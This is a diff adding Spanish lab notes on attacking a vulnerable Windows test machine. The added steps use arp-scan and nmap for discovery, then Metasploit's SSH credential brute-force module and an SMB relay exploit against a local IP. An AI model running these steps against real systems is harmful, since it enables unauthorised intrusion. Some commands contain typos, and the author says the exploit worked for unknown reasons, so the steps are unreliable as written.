@@ -2,9 +2,68 @@
 
 ## Máquina Windows con vulnerabilidades
 - Obtener información del sistema vulnerable
-* Explorar e identificar vulnerabilidades del sistema
-+ Explotar las vulnerabilidades
+  	*Para saber la ip del dispositivo al que queremos atacar usaremos:*
 
+  	arp-scan -l
+
+   	<br>
+    
+* Explorar e identificar vulnerabilidades del sistema
+
+	*Para saber lo puertos que están abiertos utilizaremos*
+
+  	nmap *ip del servidor*
+
+  	<br>
+   	*Si queremos un puerto en especifipo nos sirve el -p*
+  
++ Explotar las vulnerabilidades
+  
+  - Puerto 22 -> SSH
+
+    *Con este comando hacemos uso del módulo ssh_login para iniciar sesión con posibles usuarios*
+    
+        use auxiliar/scanner/ssh/ssh_login
+
+  	<br>
+    *Mostramos las opciones*
+    
+        show options
+
+  	<br>
+    *Es obligatorio poner el target, en mi caso la IP es: 192.168.0.117*
+    
+        set RHOSTS 192.168.0.117
+
+  	<br>
+    *Creamos unalista de posibles usuarios y otra con posibles contraseñas*
+    
+        set USER_FILE usuarios.txt
+        set PASS_FILE usuarios.txt
+
+  	<br>
+    *Con run se intentará iniciar sesión en el servidor SSH utilizando la lista de nombres de usuario y contraseñas*
+    
+        run
+
+    <br>
+    
+  - Puerto 139 -> netbios-ssn
+
+       *Para explotar este puerto necesitaremos explotar estos puertos*
+
+   	    use exploit windows/smb/smb_relay 
+ 
+       *Luego debemos poner el rhosts*
+
+     	    set RHOSTS 192.168.0.117
+   
+       *Luego lo ejecutamos y ya tenemos acceso*
+
+     	    run
+
+      *Para comprobar que funciona hacemos un ls y debería salir el directorio "he de decir que no se por qué funcionó pero entré" *
+      
 ## Máquina Linux con vulnerabilidades
 - Obtener información del sistema vulnerable
 
